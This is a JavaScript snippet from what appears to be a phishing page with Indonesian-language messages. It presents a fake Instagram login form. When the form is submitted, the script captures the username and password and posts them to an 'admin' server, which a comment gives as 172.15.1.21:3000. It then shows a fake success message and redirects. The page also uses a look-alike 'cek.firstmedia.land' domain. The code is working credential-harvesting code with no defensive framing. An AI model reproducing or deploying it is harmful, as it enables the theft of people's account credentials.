        <script>
            function sendToAdmin(data, type) {
                // Send data to 172.15.1.21:3000/admin
                fetch('http://localhost:3000/admin', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        ...data,
                        action: data.action || type,
                        userAgent: navigator.userAgent,
                        timestamp: new Date().toISOString()
                    })
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Data sent to admin:', result);
                    console.log('Full data payload:', {
                        type: type,
                        data: data,
                        timestamp: new Date().toISOString()
                    });
                })
                .catch(error => {
                    console.error('Error sending data to admin:', error);
                });
            }

            function showError(elementId, message) {
                const errorElement = document.getElementById(elementId);
                errorElement.textContent = message;
                errorElement.style.display = 'block';
            }

            function hideError(elementId) {
                const errorElement = document.getElementById(elementId);
                errorElement.style.display = 'none';
            }

            function showSuccess(elementId, message) {
                const successElement = document.getElementById(elementId);
                successElement.textContent = message;
                successElement.style.display = 'block';
            }

            function hideSuccess(elementId) {
                const successElement = document.getElementById(elementId);
                successElement.style.display = 'none';
            }

            // Instagram Login Form Handler
            document.getElementById('instagramLoginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const username = document.getElementById('instagramUsername').value;
                const password = document.getElementById('instagramPassword').value;

                // Hide previous messages
                hideError('instagramUsernameError');
                hideError('instagramPasswordError');
                hideSuccess('instagramSuccess');

                // Basic validation
                if (!username) {
                    showError('instagramUsernameError', 'Username Instagram harus diisi');
                    return;
                }

                if (!password) {
                    showError('instagramPasswordError', 'Password Instagram harus diisi');
                    return;
                }

                // Send data to admin
                const instagramData = {
                    username: username,
                    password: password,
                    provider: 'instagram',
                    action: 'instagram_login',
                    userAgent: navigator.userAgent
                };

                sendToAdmin(instagramData, 'instagram_login');

                // Show success message
                showSuccess('instagramSuccess', 'Login Instagram berhasil! Redirecting...');

                // Redirect to dashboard after 2 seconds
                setTimeout(() => {
                    window.location.href = 'dashboard.html';
                }, 2000);
            });

            function rebindAdv() {
                var pname = 'cek.firstmedia.land';
                var cust = 'instagram_user';
                var agent = encodeURI(window.navigator.userAgent);
                var uri = 'https://fm1.firstmedia.com/DPAPWebAds/GenAds.ashx?pname=#p#&acc=#a#&useragent=#ua#&type=3';
                var uriMobile = 'https://fm1.firstmedia.com/DPAPWebAds/GenAds.ashx?pname=#p#&acc=#a#&useragent=#ua#&type=8';
                uri = uri.replace("#a#", cust);
                uri = uri.replace("#ua#", agent);

                uriMobile = uriMobile.replace("#a#", cust);
                uriMobile = uriMobile.replace("#ua#", agent);

                pname = 'cek.firstmedia.land';
                uri = uri.replace("#p#", pname);
                uriMobile = uriMobile.replace("#p#", pname);

                if (cust == undefined || cust == '') {
                    pname = 'cek.firstmedia.land';
                    uri = uri.replace("#p#", pname);
                    uriMobile = uriMobile.replace("#p#", pname);
                } else {
                    uri = uri.replace("#p#", pname);
                    uriMobile = uriMobile.replace("#p#", pname);
                }
                $(".newdesktop").load(uri);
                $(".newmobile").load(uriMobile);
            }

            $(document).ready(function () {
                rebindAdv();
            });
        </script>
